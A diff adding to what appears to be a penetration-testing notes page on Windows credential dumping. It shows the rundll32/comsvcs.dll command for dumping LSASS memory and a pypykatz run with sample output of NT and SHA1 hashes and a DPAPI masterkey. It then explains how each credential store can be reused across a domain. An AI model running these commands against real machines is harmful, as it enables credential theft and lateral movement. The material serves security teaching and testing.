@@ -178,3 +178,57 @@ We can use the `rundll32.exe` CLI utility to dump the process memory. It is fast
 	1. `rundll32 C:\windows\system32\comsvcs.dll, MiniDump [PID] C:\lsass.dmp full`
 > This command uses `rundll32.exe` to run `comsvcs.dll` which in-turn calls MiniDumpWriteDump (`MiniDump`) on the LSASS process memory, outputting to `C:\lsass.dmp`
 
+**Extracting the LSASS credential stores**
+The LSASS dump acts like a snapshot of all the active logon sessions at the time it was captured, this means the credentials for these sessions are in the dump.
+
+Running [pypykatz](https://github.com/skelsec/pypykatz) against the minidump can identify the credentials in the dump:
+```sh
+$ pypykatz lsa minidump ./lsass.dmp
+```
+```sh
+FILE: ======== ../lsass.dmp =======
+== LogonSession ==
+# <..SNIP..>
+username bob
+# <..SNIP..>
+	== MSV ==
+		Username: bob
+		Domain: DESKTOP-33E7O54
+		LM: NA
+		NT: 64f12cddaa88057e06a81b54e73b949b
+		SHA1: cba4e545b7ec918129725154b29f055e4cd5aea8
+		DPAPI: NA
+	== WDIGEST [14ab89]==
+		username bob
+		domainname DESKTOP-33E7O54
+		password None
+		password (hex)
+	== Kerberos ==
+		Username: bob
+		Domain: DESKTOP-33E7O54
+	== WDIGEST [14ab89]==
+		username bob
+		domainname DESKTOP-33E7O54
+		password None
+		password (hex)
+	== DPAPI [14ab89]==
+		luid 1354633
+		key_guid 3e1d1091-b792-45df-ab8e-c66af044d69b
+		masterkey e8bc2faf77e7bd1891c0e49f0dea9d447a491107ef5b25b9929071f68db5b0d55bf05df5a474d9bd94d98be4b4ddb690e6d8307a86be6f81be0d554f195fba92
+		sha1_masterkey 52e758b6120389898f7fae553ac8172b43221605
+```
+
+Breaking this down, we can see a bunch of different credentials for different providers. As LSA works with multiple credential providers, it stores the creds for that user for each one.
+
+**MSV**
+[MSV](https://docs.microsoft.com/en-us/windows/win32/secauthn/msv1-0-authentication-package) is the auth package LSA uses to validate against the SAM database. From the dump we got an `NTLM` & `SHA1` hash of their password.
+
+**WDIGEST**
+An older auth protocol enabled by default in *Windows XP -> Windows 8* & *Windows Server 2003 -> 2012*. LSASS stores these credentials in plain-text!
+> Microsoft have released a security update for this issue : https://msrc-blog.microsoft.com/2014/06/05/an-overview-of-kb2871997/
+
+**Kerberos**
+[Kerberos](https://web.mit.edu/kerberos/#what_is) is a network auth protocol used by Active Directory. Domain user accounts are granted a ticket upon authentication with AD. This ticket allows them access to shared resources without having to type a credential each time. *LSASS caches passwords, ekeys, tickets, and pins* associated with Kerberos. We can extract these and use them to access other systems and resources in the domain.
+
+**DPAPI**
+The *Data Protection Application Programming Interface* (*[DPAPI](https://docs.microsoft.com/en-us/dotnet/standard/security/how-to-use-data-protection)*) is a set of Windows APIs used to encrypt and decrypt DPAPI data blobs for windows features & third-party apps. The `masterkey` is used to decrypt the secrets associated with each application and allows us to capture all kinds of account credentials.
